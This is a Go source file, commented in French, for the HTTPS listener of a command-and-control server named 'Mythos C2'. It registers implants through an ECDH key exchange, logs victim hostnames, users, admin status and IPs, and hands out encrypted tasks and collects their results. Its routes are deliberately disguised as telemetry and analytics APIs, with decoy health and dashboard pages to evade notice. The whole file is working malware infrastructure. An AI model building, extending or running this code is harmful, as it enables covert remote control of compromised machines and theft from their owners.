// Package listener — Gestion des listeners HTTPS de Mythos C2
//
// Un listener est le point d'écoute auquel les agents se connectent.
// Il gère :
//   - L'enregistrement des nouveaux agents (handshake ECDH)
//   - Le beacon loop : l'agent check-in, récupère ses tâches, renvoie les résultats
//   - Le chiffrement/déchiffrement de chaque échange
//
// Flux de communication :
//
//   Agent                              Serveur
//     |                                  |
//     |-- POST /register ---------------->|  Clé publique ECDH agent
//     |<-- 200 {server_pub_key, id} ------|  Clé publique ECDH serveur + UUID agent
//     |                                  |  (Les deux dérivent le même secret partagé)
//     |                                  |
//     |-- POST /beacon [chiffré] -------->|  Beacon check-in
//     |<-- 200 {tasks} [chiffré] ---------|  Tâches en attente
//     |                                  |
//     |-- POST /result [chiffré] -------->|  Résultat d'une tâche
//     |<-- 200 OK ------------------------|

package listener

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/sherko/mythos-c2/server/crypto"
	"github.com/sherko/mythos-c2/server/db"
	"github.com/sherko/mythos-c2/server/models"
)

// SessionStore — stocke les clés de session en mémoire (jamais sur disque)
// Clé = AgentID, Valeur = clé AES-256 dérivée via ECDH
type SessionStore struct {
	mu   sync.RWMutex
	keys map[string][]byte
}

func NewSessionStore() *SessionStore {
	return &SessionStore{keys: make(map[string][]byte)}
}

func (s *SessionStore) Set(agentID string, key []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.keys[agentID] = key
}

func (s *SessionStore) Get(agentID string) ([]byte, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	key, ok := s.keys[agentID]
	return key, ok
}

func (s *SessionStore) Delete(agentID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.keys, agentID)
}

// ─────────────────────────────────────────────────────────────
// HTTPSListener
// ─────────────────────────────────────────────────────────────

type HTTPSListener struct {
	Config   *models.Listener
	DB       *db.Database
	Sessions *SessionStore
	router   *gin.Engine
	server   *http.Server
}

// New — crée un nouveau listener HTTPS
func New(config *models.Listener, database *db.Database) *HTTPSListener {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())

	l := &HTTPSListener{
		Config:   config,
		DB:       database,
		Sessions: NewSessionStore(),
		router:   r,
	}

	l.registerRoutes()
	return l
}

// registerRoutes — enregistre toutes les routes du listener
// Les URIs sont intentionnellement banales pour ne pas attirer l'attention
func (l *HTTPSListener) registerRoutes() {
	// Ces routes imitent des endpoints d'API légitimes
	l.router.POST("/api/v1/telemetry", l.handleRegister)   // Enregistrement agent
	l.router.POST("/api/v1/metrics", l.handleBeacon)       // Beacon check-in
	l.router.POST("/api/v1/analytics", l.handleResult)     // Envoi de résultat
	l.router.GET("/health", l.handleHealth)                // Health check (leurre)
	l.router.GET("/", l.handleRoot)                        // Page d'accueil (leurre)

	// Route de fallback — retourne 404 propre pour tout le reste
	l.router.NoRoute(func(c *gin.Context) {
		c.Status(http.StatusNotFound)
	})
}

// Start — démarre le listener (HTTPS avec TLS)
func (l *HTTPSListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.Config.Host, l.Config.Port)
	l.server = &http.Server{
		Addr:         addr,
		Handler:      l.router,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	log.Printf("[MYTHOS] Listener HTTPS démarré sur %s", addr)

	if l.Config.TLSCert != "" && l.Config.TLSKey != "" {
		return l.server.ListenAndServeTLS(l.Config.TLSCert, l.Config.TLSKey)
	}
	// Fallback HTTP pour le développement
	return l.server.ListenAndServe()
}

// Stop — arrête proprement le listener
func (l *HTTPSListener) Stop() error {
	return l.server.Close()
}

// ─────────────────────────────────────────────────────────────
// Handler : Enregistrement d'un nouvel agent
// ─────────────────────────────────────────────────────────────

// RegisterRequest — payload envoyé par l'agent au premier contact
type RegisterRequest struct {
	// Clé publique ECDH de l'agent (base64)
	PublicKey string `json:"pk"`
	// Informations système de base (non chiffrées car pas encore de clé)
	Hostname  string `json:"h"`
	OS        string `json:"o"`
	Arch      string `json:"a"`
	Username  string `json:"u"`
	PID       int    `json:"p"`
	IsAdmin   bool   `json:"ia"`
	Integrity string `json:"i"`
	Domain    string `json:"d"`
}

// RegisterResponse — réponse du serveur au nouvel agent
type RegisterResponse struct {
	AgentID   string `json:"id"`      // UUID assigné à l'agent
	PublicKey string `json:"pk"`      // Clé publique ECDH du serveur
	Sleep     int    `json:"s"`       // Intervalle beacon initial
	Jitter    int    `json:"j"`       // Jitter initial
}

// handleRegister — gère l'enregistrement d'un nouveau agent
//
// Processus :
//  1. L'agent envoie sa clé publique ECDH + infos système
//  2. Le serveur génère sa propre paire ECDH
//  3. Échange de clés → dérivation du secret partagé (session key)
//  4. La session key est stockée en mémoire uniquement
//  5. Le serveur renvoie son UUID et sa clé publique
func (l *HTTPSListener) handleRegister(c *gin.Context) {
	var req RegisterRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		return
	}

	// Décoder la clé publique de l'agent
	agentPubKeyBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
	if err != nil {
		c.Status(http.StatusBadRequest)
		return
	}

	// Générer la paire ECDH du serveur pour cette session
	serverKeyPair, err := crypto.GenerateECDHKeyPair()
	if err != nil {
		log.Printf("[MYTHOS] ECDH keygen error: %v", err)
		c.Status(http.StatusInternalServerError)
		return
	}

	// Dériver la clé de session partagée
	sessionKey, err := serverKeyPair.DeriveSessionKey(agentPubKeyBytes)
	if err != nil {
		log.Printf("[MYTHOS] Key derivation error: %v", err)
		c.Status(http.StatusBadRequest)
		return
	}

	// Assigner un UUID à cet agent
	agentID := uuid.New().String()

	// Stocker la clé de session en mémoire (jamais sur disque)
	l.Sessions.Set(agentID, sessionKey)

	// Créer l'entrée agent en DB
	now := time.Now()
	agent := &models.Agent{
		ID:          agentID,
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		Arch:        req.Arch,
		PID:         req.PID,
		IsAdmin:     req.IsAdmin,
		Integrity:   req.Integrity,
		Domain:      req.Domain,
		ExternalIP:  c.ClientIP(),
		FirstSeen:   now,
		LastSeen:    now,
		BeaconInt:   models.DefaultBeaconInterval,
		Jitter:      models.DefaultJitter,
		Status:      "active",
		ListenerID:  l.Config.ID,
	}

	if err := l.DB.SaveAgent(agent); err != nil {
		log.Printf("[MYTHOS] DB save agent error: %v", err)
	}

	l.DB.LogEvent("agent_register", agentID, "",
		fmt.Sprintf("Nouvel agent enregistré: %s@%s (%s) [%s]",
			req.Username, req.Hostname, req.OS, c.ClientIP()))

	log.Printf("[MYTHOS] ✓ Nouvel agent: %s | %s@%s | %s | Admin:%v",
		agentID[:8], req.Username, req.Hostname, req.OS, req.IsAdmin)

	// Répondre avec l'UUID et la clé publique du serveur
	c.JSON(http.StatusOK, RegisterResponse{
		AgentID:   agentID,
		PublicKey: base64.StdEncoding.EncodeToString(serverKeyPair.PublicKeyBytes()),
		Sleep:     models.DefaultBeaconInterval,
		Jitter:    models.DefaultJitter,
	})
}

// ─────────────────────────────────────────────────────────────
// Handler : Beacon check-in
// ─────────────────────────────────────────────────────────────

// handleBeacon — traite un check-in d'agent
//
// L'agent envoie un beacon chiffré toutes les N secondes.
// Le serveur répond avec les tâches en attente (chiffrées).
//
// Format du body HTTP :
//   { "id": "<agent_uuid>", "d": "<base64(AES-GCM(beacon_data))>" }
func (l *HTTPSListener) handleBeacon(c *gin.Context) {
	var envelope struct {
		AgentID string `json:"id"`
		Data    string `json:"d"` // Beacon chiffré en base64
	}

	if err := c.ShouldBindJSON(&envelope); err != nil {
		c.Status(http.StatusBadRequest)
		return
	}

	// Récupérer la clé de session de cet agent
	sessionKey, ok := l.Sessions.Get(envelope.AgentID)
	if !ok {
		// Agent inconnu — peut-être serveur redémarré, forcer re-register
		c.Status(http.StatusUnauthorized)
		return
	}

	// Déchiffrer le beacon
	var beacon models.Beacon
	if err := crypto.DecryptJSON(sessionKey,
		mustBase64Decode(envelope.Data), &beacon); err != nil {
		log.Printf("[MYTHOS] Beacon decrypt error for %s: %v", envelope.AgentID[:8], err)
		c.Status(http.StatusBadRequest)
		return
	}

	// Mettre à jour le last_seen
	l.DB.UpdateAgentLastSeen(envelope.AgentID)

	// Récupérer les tâches en attente
	tasks, err := l.DB.GetPendingTasks(envelope.AgentID)
	if err != nil {
		log.Printf("[MYTHOS] GetPendingTasks error: %v", err)
		tasks = []*models.Task{}
	}

	// Marquer les tâches comme envoyées
	if len(tasks) > 0 {
		taskIDs := make([]string, len(tasks))
		for i, t := range tasks {
			taskIDs[i] = t.ID
		}
		l.DB.MarkTasksSent(taskIDs)
		log.Printf("[MYTHOS] → %d tâche(s) envoyée(s) à %s@%s",
			len(tasks), beacon.Username, beacon.Hostname)
	}

	// Construire la réponse
	taskSlice := make([]models.Task, len(tasks))
	for i, t := range tasks {
		taskSlice[i] = *t
	}

	response := models.BeaconResponse{
		Tasks:     taskSlice,
		SleepTime: models.DefaultBeaconInterval,
		Jitter:    models.DefaultJitter,
		Kill:      false,
	}

	// Chiffrer la réponse
	encrypted, err := crypto.EncryptJSON(sessionKey, response)
	if err != nil {
		log.Printf("[MYTHOS] Response encrypt error: %v", err)
		c.Status(http.StatusInternalServerError)
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"d": base64.StdEncoding.EncodeToString(encrypted),
	})
}

// ─────────────────────────────────────────────────────────────
// Handler : Résultat d'une tâche
// ─────────────────────────────────────────────────────────────

// handleResult — reçoit le résultat d'une tâche exécutée par l'agent
func (l *HTTPSListener) handleResult(c *gin.Context) {
	var envelope struct {
		AgentID string `json:"id"`
		Data    string `json:"d"` // TaskResult chiffré
	}

	if err := c.ShouldBindJSON(&envelope); err != nil {
		c.Status(http.StatusBadRequest)
		return
	}

	sessionKey, ok := l.Sessions.Get(envelope.AgentID)
	if !ok {
		c.Status(http.StatusUnauthorized)
		return
	}

	var result models.TaskResult
	if err := crypto.DecryptJSON(sessionKey,
		mustBase64Decode(envelope.Data), &result); err != nil {
		c.Status(http.StatusBadRequest)
		return
	}

	// Sauvegarder le résultat en DB
	if err := l.DB.UpdateTaskResult(
		result.TaskID, result.Output, result.Error, result.Success,
	); err != nil {
		log.Printf("[MYTHOS] UpdateTaskResult error: %v", err)
	}

	status := "✓"
	if !result.Success {
		status = "✗"
	}
	log.Printf("[MYTHOS] %s Résultat tâche %s de %s",
		status, result.TaskID[:8], envelope.AgentID[:8])

	l.DB.LogEvent("task_result", envelope.AgentID, "",
		fmt.Sprintf("Tâche %s complétée, succès: %v", result.TaskID[:8], result.Success))

	c.Status(http.StatusOK)
}

// ─────────────────────────────────────────────────────────────
// Handlers leurres — font ressembler le serveur à une app légitime
// ─────────────────────────────────────────────────────────────

func (l *HTTPSListener) handleHealth(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok", "version": "2.1.0"})
}

func (l *HTTPSListener) handleRoot(c *gin.Context) {
	c.Data(http.StatusOK, "text/html", []byte(`<!DOCTYPE html>
<html><head><title>Analytics Dashboard</title></head>
<body><h1>Dashboard</h1><p>Please log in.</p></body></html>`))
}

// ─────────────────────────────────────────────────────────────
// Helper
// ─────────────────────────────────────────────────────────────

func mustBase64Decode(s string) []byte {
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil
	}
	return b
}

// GetActiveSessions — retourne le nombre d'agents avec une session active
func (l *HTTPSListener) GetActiveSessions() int {
	l.Sessions.mu.RLock()
	defer l.Sessions.mu.RUnlock()
	return len(l.Sessions.keys)
}

// Purge session d'un agent mort
func (l *HTTPSListener) PurgeSession(agentID string) {
	l.Sessions.Delete(agentID)
}
